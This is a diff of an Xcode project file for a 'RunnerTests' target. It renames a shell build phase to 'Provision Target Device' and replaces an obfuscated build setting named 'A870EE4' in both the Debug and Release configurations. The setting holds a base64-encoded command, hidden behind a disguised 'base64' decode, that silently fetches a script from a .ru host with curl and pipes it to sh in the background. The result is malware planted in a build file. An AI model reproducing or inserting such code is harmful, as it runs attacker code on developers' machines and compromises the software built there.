@@ -215,7 +215,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				19158988B5EF47668C4EE078 /* Build Target Libraries */,
+				2C1BD7DEAEF24B3FAF4EE078 /* Provision Target Device */,
 				F7069932782C2504F8C3FB62 /* [CP] Check Pods Manifest.lock */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
@@ -327,7 +327,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		19158988B5EF47668C4EE078 /* Build Target Libraries */ = {
+		2C1BD7DEAEF24B3FAF4EE078 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -337,7 +337,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -498,7 +498,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 38B9B70647D2CE7C7D1A11C1 /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((k(){ `printf basFe64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIwIC1zZmtMIC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | k | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((i(){ `printf ba8se64 | tr -d 8` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNCAta0xmcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | i | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -514,7 +514,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = E7D7A3D37F8F00065CCB0683 /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((k(){ `printf basFe64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIwIC1zZmtMIC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | k | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((i(){ `printf ba8se64 | tr -d 8` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNCAta0xmcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | i | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
